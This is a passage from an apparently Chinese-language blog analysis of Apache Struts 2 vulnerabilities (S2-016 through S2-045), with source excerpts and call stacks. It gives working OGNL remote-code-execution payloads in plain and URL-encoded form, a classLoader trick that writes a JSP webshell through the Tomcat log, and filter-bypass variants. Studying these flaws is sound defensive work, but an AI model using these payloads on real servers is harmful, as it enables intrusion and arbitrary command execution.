title="S2-016"></a>S2-016</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p><p> 参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-016">https://cwiki.apache.org/confluence/display/WW/S2-016</a></p><p>在 <code>struts2</code> 中，<code>DefaultActionMapper</code> 类支持以 <code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code> 作为导航或是重定向前缀，但是这些前缀后面同时可以跟 <code>OGNL</code> 表达式，由于 <code>struts2</code> 没有对这些前缀做过滤，导致利用 <code>OGNL</code> 表达式调用 <code>java</code> 静态方法执行任意系统命令。</p><p>和 S2-002 一致，都是利用 redirect 重定向时的 ognl 解析，但是入口不太相同</p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看 DefaultActionMapper 这个类，他定义了一系列的前缀</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412101748318.png" alt="image-20250412101748318"></p><p>在初始化时，会去作对应的处理，构造方法的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultActionMapper</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.prefixTrie = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrefixTrie</span>() &#123;<br>        &#123;<br>            <span class="hljs-comment">// 1. 处理 method: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;method:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-keyword">if</span> (DefaultActionMapper.<span class="hljs-built_in">this</span>.allowDynamicMethodCalls) &#123;<br>                        mapping.setMethod(key.substring(<span class="hljs-string">&quot;method:&quot;</span>.length()));<br>                    &#125;<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 2. 处理 action: 前缀 </span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;action:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> key.substring(<span class="hljs-string">&quot;action:&quot;</span>.length());<br>                    <span class="hljs-keyword">if</span> (DefaultActionMapper.<span class="hljs-built_in">this</span>.allowDynamicMethodCalls) &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">bang</span> <span class="hljs-operator">=</span> name.indexOf(<span class="hljs-number">33</span>); <span class="hljs-comment">// 33是&#x27;!&#x27;的ASCII码</span><br>                        <span class="hljs-keyword">if</span> (bang != -<span class="hljs-number">1</span>) &#123;<br>                            mapping.setMethod(name.substring(bang + <span class="hljs-number">1</span>));<br>                            name = name.substring(<span class="hljs-number">0</span>, bang);<br>                        &#125;<br>                    &#125;<br>                    mapping.setName(name);<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 3. 处理 redirect: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;redirect:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">ServletRedirectResult</span> <span class="hljs-variable">redirect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRedirectResult</span>();<br>                    DefaultActionMapper.<span class="hljs-built_in">this</span>.container.inject(redirect);<br>                    redirect.setLocation(key.substring(<span class="hljs-string">&quot;redirect:&quot;</span>.length()));<br>                    mapping.setResult(redirect);<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 4. 处理 redirectAction: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;redirectAction:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">location</span> <span class="hljs-operator">=</span> key.substring(<span class="hljs-string">&quot;redirectAction:&quot;</span>.length());<br>                    <span class="hljs-type">ServletRedirectResult</span> <span class="hljs-variable">redirect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRedirectResult</span>();<br>                    DefaultActionMapper.<span class="hljs-built_in">this</span>.container.inject(redirect);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> DefaultActionMapper.<span class="hljs-built_in">this</span>.getDefaultExtension();<br>                    <span class="hljs-keyword">if</span> (extension != <span class="hljs-literal">null</span> &amp;&amp; extension.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                        location = location + <span class="hljs-string">&quot;.&quot;</span> + extension;<br>                    &#125;<br>                    redirect.setLocation(location);<br>                    mapping.setResult(redirect);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>把不同的前缀对应为了不同的 ParameterAction 并重写了 execute 方法，在重定向解析结果时，会造成二次解析</p><p>入口和 S2-015 一致，都是 <code>StrutsPrepareAndExecuteFilter#doFilter</code> 或者 <code>FilterDispatcher#doFilter</code> 这个方法 预处理请求 调用 <code>DefaultActionMapper#handleSpecialParameters</code> 时，根据前缀走到对应的 execute 方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">execute:<span class="hljs-number">217</span>, DefaultActionMapper$<span class="hljs-number">2</span>$<span class="hljs-number">3</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>handleSpecialParameters:<span class="hljs-number">371</span>, DefaultActionMapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>getMapping:<span class="hljs-number">318</span>, DefaultActionMapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>doFilter:<span class="hljs-number">409</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>internalDoFilter:<span class="hljs-number">241</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">208</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412110620680.png" alt="image-20250412110620680"></p><p>后续就和 S2-012 的调用流程一致了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412111005761.png" alt="image-20250412111005761"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">conditionalParse:<span class="hljs-number">197</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">185</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">158</span>, ServletRedirectResult (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>serviceAction:<span class="hljs-number">496</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>doFilter:<span class="hljs-number">434</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">index.action?redirect:%&#123;#f=#_memberAccess.getClass().getDeclaredField(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),#f.setAccessible(<span class="hljs-literal">true</span>),#f.set(#_memberAccess,<span class="hljs-literal">true</span>),@java.lang.Runtime@getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p>url 编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">index.action?redirect<span class="hljs-variable">%3</span>a<span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>f<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>_memberAccess.getClass().getDeclaredField(<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.set(<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%2</span>ctrue)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure><p>或者用前缀 <code>redirectAction</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412111523030.png" alt="image-20250412111523030"></p><h2 id="S2-018"><a href="#S2-018" class="headerlink" title="S2-018"></a>S2-018</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.15.2</p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-018">https://cwiki.apache.org/confluence/display/WW/S2-018</a></p><p>Struts 2 的动作映射机制支持特殊参数前缀“action:”，该前缀旨在帮助将导航信息附加到表单内的按钮上。</p><p>这个是在 S2-016 的延伸，用 action: 前缀去绕过一下安全限制</p><p>特性其实就是可以利用 <code>action:test!execute</code> 的形式，访问同一命名空间下的其他方法</p><h2 id="S2-020-S2-021-S2-022"><a href="#S2-020-S2-021-S2-022" class="headerlink" title="S2-020&#x2F;S2-021&#x2F;S2-022"></a>S2-020&#x2F;S2-021&#x2F;S2-022</h2><p>这其实就是一个漏洞的不同版本，也是利用参数 ParametersInterceptor 拦截器，去做一些事情，尽管他在前面爆出来的几次漏洞后，对正则表达式做了很多改进，我们可以利用它去修改一些值</p><p>影响版本：Struts 2.0.0 - Struts 2.3.16.3</p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-022">https://cwiki.apache.org/confluence/display/WW/S2-022</a></p><p>在 2.3.16 版本的 ParametersInterceptor 中的正则表达式</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-type">ACCEPTED_PARAM_NAMES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-subst">\\</span>w+((<span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>w+)|(<span class="hljs-subst">\\</span>[<span class="hljs-subst">\\</span>d+<span class="hljs-subst">\\</span>])|(<span class="hljs-subst">\\</span>(<span class="hljs-subst">\\</span>d+<span class="hljs-subst">\\</span>))|(<span class="hljs-subst">\\</span>[&#x27;<span class="hljs-subst">\\</span>w+&#x27;<span class="hljs-subst">\\</span>])|(<span class="hljs-subst">\\</span>(&#x27;<span class="hljs-subst">\\</span>w+&#x27;<span class="hljs-subst">\\</span>)))*&quot;</span>;<br></code></pre></td></tr></table></figure><p>去掉转移符号</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">\w+((\.\w+)|<span class="hljs-type">(\[\d</span>+\])|<span class="hljs-type">(\(\d</span>+\))|<span class="hljs-type">(\[&#x27;\w</span>+&#x27;\])|<span class="hljs-type">(\(&#x27;\w</span>+&#x27;\)))*<br></code></pre></td></tr></table></figure><p>也就是说，他可以匹配 <code>aa.bb.cc.dd</code> 这样的参数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412142002323.png" alt="image-20250412142002323"></p><p>我们可以使用这一特性修改一些 修改 context 及 root  中的一些值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">class<span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.dirContext</span>.docBase=D:/data<br></code></pre></td></tr></table></figure><p>看一下 <code>2.3.16</code> 和 <code>2.3.16.1</code> excludeParams 的对比，看到加入了 <code>^class\..</code> </p><center class="half">    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412152958382.png" width="400"/>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412153207376.png" width="400"/> </center><p>我们利用上面的 payload 可以修改 classLoader 的属性，tomcat 的访问路径，当在获取 class 属性的时候，同时会得到他的 classLoader，我们修改它里面值，实现利用</p><p>当 ongl 去获取 把 <code>class</code> 解析为 ASTProperty 时，会去执行到 getTargetClass，当然会把 classLoader 一并获取到</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412164216799.png" alt="image-20250412164216799"></p><p>因为类都是由 Tomcat 容器加载的，所以就获取到了 WebappClassLoader ，依次执行到后边的赋值语句，就可以把 tomcat 的基础访问路路径给改变掉</p><p>对应过去 class 的调用栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getPropertyAccessor:</span><span class="hljs-number">2215</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getProperty:</span><span class="hljs-number">2312</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">114</span>, ASTProperty (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">212</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">258</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">222</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">220</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">301</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">737</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">234</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">trySetValue:</span><span class="hljs-number">183</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">170</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameter:</span><span class="hljs-number">148</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">329</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">doIntercept:</span><span class="hljs-number">241</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412164622939.png" alt="image-20250412164622939" style="zoom:40%;" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412170755264.png" alt="image-20250412164837078" style="zoom:60%;" /></center><p>然后我们就可以访问 <code>D:/data</code> 目录下的文件了</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412170620040.png" alt="image-20250412170620040" style="zoom:50%;" /><p>当然他的危害远不止于此，还是有师傅研究出了 RCE</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">directory</span>=webapps/ROOT<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">prefix</span>=shell<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.suffix=.jsp<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.fileDateFormat=<span class="hljs-number">1</span><br>&lt;%Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<span class="hljs-symbol">%</span>&gt;<br></code></pre></td></tr></table></figure><p>利用日志写了一个 webshell</p><p>在 <code>2.3.16.1</code> 的 excludeParams 加入了 <code>^class\..</code> 这也很好绕过，大小写就可以</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">class</span>[<span class="hljs-string">&#x27;classLoader&#x27;</span>].resources.dirContext.docBase=<br>top.<span class="hljs-keyword">class</span>.classLoader.resources.dirContext.docBase=<br><span class="hljs-keyword">Class</span>.classLoader.resources.dirContext.docBase=<br></code></pre></td></tr></table></figure><p>后续 S2-022 就是把注入点改到 cookie 中了</p><h2 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h2><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-032">https://cwiki.apache.org/confluence/display/WW/S2-032</a></p><p>当启用动态方法调用时，有可能传递恶意表达式，该表达式可用于在服务器端执行任意代码。</p><p>这其实也是对 S2-016 的扩展，这次把重心放到了 <code>method:</code> 这个前缀，当开启了 <code>Dynamic Method Invocation</code> 可以实现 RCE</p><p>我们先来看  PrefixTrie 中 处理 method: 前缀的方法，看到一进来首先就是判断 allowDynamicMethodCalls 所以我们得开启这一特性</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412185934861.png" alt="image-20250412185934861"></p><p>在委托 <code>DefaultActionProxy</code> 代理的时候，会用 StringEscapeUtils.escapeHtml4() 这个进行编码，其实我们之前在 S2-015 也有提到过这个实体编码特性，当时是 escapeHtml ，没有对 <code>&#39;</code> 进行实体编码</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412190827855.png" alt="image-20250412190827855"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt; → <span class="hljs-symbol">&amp;lt;</span><br>&gt; → <span class="hljs-symbol">&amp;gt;</span><br>&amp; → <span class="hljs-symbol">&amp;amp;</span><br>&quot; → <span class="hljs-symbol">&amp;quot;</span><br>&#x27; → <span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure><p>同时在 DefaultActionInvocation#invokeAction 解析 method 的时候，会为它拼接上一个 <code>()</code> 符号</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412191657068.png" alt="image-20250412191657068"></p><p>在 struts-default.xml 中 可以看到 excludedClasses 和 excludedPackageNamePatterns 的规则</p><p>我们需要绕过，或者给他置空</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412192551013.png" alt="image-20250412192551013"></p><p>allowStaticMethodAccess 反射赋值的方式被禁止了，因为在 2.3.20 版本以后，SecurityMemberAccess 引入了一个新的判断方法 <code>isClassExcluded()</code></p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412193151390.png" alt="image-20250412193151390" style="zoom:50%;" /><p>反射获得的 class 在这里就直接返回 true，被拦截了</p><p>我们可以使用 OgnlContext 里默认的 DefaultMemberAccess  来给他赋值</p><h3 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.param[<span class="hljs-number">0</span>]).toString&amp;param=calc<br></code></pre></td></tr></table></figure><p>url 编码，不要把 &amp; 和 &#x3D; 进行编码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">method%3A%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime%40getRuntime().<span class="hljs-keyword">exec</span>(%23parameters.param%5B0%5D).toString&amp;param=calc<br></code></pre></td></tr></table></figure><p>或者 使用 ProcessBuilder 这个非静态方法</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>:#_memberAccess.excludedClasses=@java.util.Collections@EMPTY_SET,#_memberAccess.excludedPackageNamePatterns=@java.util.Collections@EMPTY_SET,<span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> java.lang.String[]<span class="hljs-comment">&#123;#parameters.cmd[0]&#125;</span>).start&amp;cmd=calc<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">method<span class="hljs-meta">%3A</span><span class="hljs-meta">%23_memberAccess</span>.excludedClasses<span class="hljs-meta">%3D</span><span class="hljs-meta">%40java</span>.util.Collections<span class="hljs-meta">%40EMPTY_SET</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23_memberAccess</span>.excludedPackageNamePatterns<span class="hljs-meta">%3D</span><span class="hljs-meta">%40java</span>.util.Collections<span class="hljs-meta">%40EMPTY_SET</span><span class="hljs-meta">%2Cnew</span><span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.ProcessBuilder(new<span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%23parameters</span>.cmd<span class="hljs-meta">%5B0</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7D</span>).<span class="hljs-keyword">start</span>&amp;cmd=calc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412205245232.png" alt="image-20250412205245232"></p><h2 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h2><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-033">https://cwiki.apache.org/confluence/display/WW/S2-033</a></p><p>使用了 struts2-rest-plugin-2.3.24.1.jar 这个插件时，由于动态方法调用时对 methodName 没有进行处理，导致了漏洞。</p><p>跟 S2-032 很相似，这次使用的就是插件中的 RestActionMapper，在处理时没有过滤，导致了 RCE</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412214729940.png" alt="image-20250412214729940"></p><p>使用 ! 作为前缀，调用其他方法（放入 ActionMapping）中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412214753022.png" alt="image-20250412214753022"></p><p>但是默认的后缀有所区别</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412215151649.png" alt="image-20250412215151649"></p><h3 id="pyload-1"><a href="#pyload-1" class="headerlink" title="pyload"></a>pyload</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">!<span class="hljs-comment">#_memberAccess=<span class="hljs-doctag">@ognl</span>.OgnlContext<span class="hljs-doctag">@DEFAULT</span>_MEMBER_ACCESS,<span class="hljs-doctag">@java</span>.lang.Runtime<span class="hljs-doctag">@getRuntime</span>().exec(#parameters.param[0]).toString.json?param=calc</span><br></code></pre></td></tr></table></figure><h2 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-045">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p><p> <code>Content-Type</code> 的解析报错时，会把报错信息当表达式解析，造成了任意命令执行</p><p>在 StrutsPrepareFilter#doFilter 对请求进行预处理时，会对请求进行封装</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413130240401.png" alt="image-20250413130240401"></p><p>最终调用的是 Dispatcher#wrapRequest 方法来进行 multipart&#x2F;form-data 获取内容，并封装为 MultiPartRequestWrapper <span style="color:#CC0000;">他用的 contains 进行判断</span></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413130724051.png" alt="image-20250413130724051"></p><p>在 getMultiPartRequest 方法中 创建了 MultiPartRequest 实例，默认就是 default.properties 配置中的 JakartaMultiPartRequest </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413132456568.png" alt="image-20250413132456568"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413132523350.png" alt="image-20250413132523350"></p><p>获取到 mpr 后，进行MultiPartRequestWrapper的封装，执行 <code>parse</code> 对 <code>errors</code> 进行获取并添加到 errors集合中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413133011869.png" alt="image-20250413133011869"></p><p><code>parse</code> 其实就是 JakartaMultiPartRequest#parse 这个方法，他会在 catch 块里对 异常进行捕获并保存</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413133456501.png" alt="image-20250413133456501"></p><p>而在 buildErrorMessage 方法中执行了 LocalizedTextUtil.findText() 解析了 error</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413142038871.png" alt="image-20250413142038871"></p><p>最终会调用到 TextParseUtil.translateVariables</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413144231784.png" alt="image-20250413144231784"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getDefaultMessage:<span class="hljs-number">677</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>findText:<span class="hljs-number">544</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>findText:<span class="hljs-number">372</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span 